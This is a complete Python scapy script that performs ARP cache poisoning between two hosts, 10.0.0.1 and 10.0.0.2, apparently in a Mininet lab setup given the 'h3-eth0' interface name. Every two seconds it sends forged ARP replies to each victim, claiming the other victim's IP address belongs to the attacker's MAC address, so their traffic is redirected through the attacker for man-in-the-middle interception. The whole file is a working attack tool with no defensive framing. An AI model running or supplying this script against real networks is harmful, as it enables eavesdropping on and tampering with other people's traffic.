from scapy.all import *
import time

# IP addresses of Host 1 and Host 2
victim1_ip = "10.0.0.1"  # Host 1 IP
victim2_ip = "10.0.0.2"  # Host 2 IP

# Host 3 MAC address
attacker_mac = get_if_hwaddr('h3-eth0')

def arp_poison(victim1_ip, victim2_ip):
    victim1_mac = getmacbyip(victim1_ip)
    victim2_mac = getmacbyip(victim2_ip)

    print(f"Poisoning ARP cache of {victim1_ip} and {victim2_ip}")

    while True:
        # Poison Host 1's ARP cache (saying Host 2's IP is at Host 3's MAC)
        arp_reply_to_victim1 = ARP(op=2, pdst=victim1_ip, hwdst=victim1_mac, psrc=victim2_ip, hwsrc=attacker_mac)
        send(arp_reply_to_victim1, verbose=False)

        # Poison Host 2's ARP cache (saying Host 1's IP is at Host 3's MAC)
        arp_reply_to_victim2 = ARP(op=2, pdst=victim2_ip, hwdst=victim2_mac, psrc=victim1_ip, hwsrc=attacker_mac)
        send(arp_reply_to_victim2, verbose=False)

        # Repeat every 2 seconds to maintain poisoning
        time.sleep(2)

try:
    arp_poison(victim1_ip, victim2_ip)
except KeyboardInterrupt:
    print("ARP poisoning stopped.")




